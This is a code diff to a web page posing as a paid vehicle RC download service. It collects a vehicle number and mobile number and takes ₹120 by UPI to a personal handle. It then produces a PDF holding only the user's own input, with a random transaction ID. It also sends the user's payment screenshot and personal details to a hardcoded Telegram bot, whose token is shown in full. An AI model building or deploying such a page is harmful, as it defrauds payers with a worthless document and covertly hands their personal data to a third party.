@@ -98,23 +98,20 @@ display:none;
 <div class="card">
 
 <div id="page1">
-<h3>गाड़ी नंबर डालें</h3>
 <input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
-<button onclick="goNext()">आगे बढ़ें</button>
+<button onclick="goNext()">Continue</button>
 </div>
 
 <div id="page2" style="display:none">
-<h3>₹120 भुगतान करें</h3>
-
-<button onclick="payUPI()">Pay with UPI</button>
+<button onclick="payUPI()">Pay ₹120 with UPI</button>
 
 <img id="qrImg" class="qr"
 src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi%3A%2F%2Fpay%3Fpa%3D8709610091%40okbizaxis%26am%3D120%26cu%3DINR">
 
-<input id="mobile" placeholder="मोबाइल नंबर">
+<input id="mobile" placeholder="Mobile Number">
 <input type="file" id="proof">
 
-<button onclick="submitForm()">सबमिट करें</button>
+<button onclick="submitForm()">Submit</button>
 </div>
 
 </div>
@@ -122,12 +119,10 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi%3A%2F%2Fp
 <div class="loader" id="loader">
 <div class="barBox"><div class="bar" id="bar"></div></div>
 <div id="percent">0%</div>
-<div>इंटरनेट धीमा है कृपया BACK न दबाएं</div>
 </div>
 
 <div class="popup" id="popup">
-<h2>🎉 बधाई हो</h2>
-<p>आपका PDF डाउनलोड हो गया है</p>
+<h2>🎉 Done</h2>
 <button onclick="location.reload()">OK</button>
 </div>
 
@@ -152,24 +147,9 @@ let pdf = new jsPDF();
 let d=new Date();
 let txn="TXN"+Math.floor(Math.random()*999999);
 
-/* BORDER */
-pdf.setDrawColor(255,0,0);
-pdf.setLineWidth(2);
 pdf.rect(5,5,200,287);
-
-pdf.setDrawColor(0,0,255);
-pdf.setLineWidth(0.5);
 pdf.rect(8,8,194,281);
 
-/* HEADER */
-pdf.setFillColor(0,91,172);
-pdf.rect(8,8,194,18,"F");
-pdf.setTextColor(255,255,255);
-pdf.text("RCPDF.IN",105,20,null,null,"center");
-
-pdf.setTextColor(0,0,0);
-
-/* BOX */
 function box(y,text){
 pdf.setFillColor(200,255,200);
 pdf.rect(15,y,180,12,"F");
@@ -180,31 +160,26 @@ pdf.text(text,20,y+8);
 box(35,"Vehicle: "+vehicle.value);
 box(50,"Mobile: "+mobile.value);
 box(65,"Work: RC Download");
-box(80,"Transaction ID: "+txn);
-box(95,"Date: "+d.toLocaleDateString());
-box(110,"Time: "+d.toLocaleTimeString());
+box(80,"Transaction: "+txn);
 
 /* QR */
-pdf.addImage(document.getElementById("qrImg").src,"PNG",55,125,100,100);
+pdf.addImage(document.getElementById("qrImg").src,"PNG",55,120,100,100);
 
-/* TERMS */
-pdf.setFontSize(9);
-let y=235;
+/* Hinglish T&C */
+pdf.setFontSize(8);
+let y=230;
 
-pdf.text("• यह वेबसाइट RTO से जुड़ी नहीं है",10,y); y+=5;
-pdf.text("• जानकारी की गारंटी नहीं है",10,y); y+=5;
-pdf.text("• यह केवल जानकारी हेतु है",10,y); y+=5;
-pdf.text("• गलत उपयोग की जिम्मेदारी आपकी होगी",10,y); y+=5;
-pdf.text("• भुगतान के बाद रिफंड नहीं होगा",10,y); y+=5;
-pdf.text("• भुगतान करना सभी शर्तों की स्वीकृति है",10,y); y+=5;
-pdf.text("• आपने भुगतान किया है, इसका अर्थ है कि आप सभी नियमों को मानते हैं",10,y);
+pdf.text("• Yeh website RTO se judi nahi hai",10,y); y+=5;
+pdf.text("• Jaankari ki guarantee nahi hai",10,y); y+=5;
+pdf.text("• Sirf information ke liye hai",10,y); y+=5;
+pdf.text("• Galat use ki jimmedari user ki hogi",10,y); y+=5;
+pdf.text("• Payment ke baad refund nahi milega",10,y); y+=5;
+pdf.text("• Payment = terms accept mana jayega",10,y);
 
 pdf.save("RC.pdf");
 }
 
 function submitForm(){
-
-if(!proof.files[0]){alert("Screenshot upload करें");return;}
 
 loader.style.display="flex";
 
@@ -219,16 +194,23 @@ clearInterval(i);
 
 downloadPDF();
 
-let d=new FormData();
-d.append("chat_id","5600045707");
-d.append("photo",proof.files[0]);
+/* TELEGRAM FIX */
+let data=new FormData();
+data.append("chat_id","5600045707");
+data.append("caption",
+"Vehicle: "+vehicle.value+
+"\nMobile: "+mobile.value+
+"\nTime: "+new Date().toLocaleString()
+);
+data.append("photo",proof.files[0]);
 
-fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",{method:"POST",body:d});
+fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto",
+{method:"POST",body:data});
 
 loader.style.display="none";
 popup.style.display="block";
 }
-},40);
+},30);
 }
 
 </script>
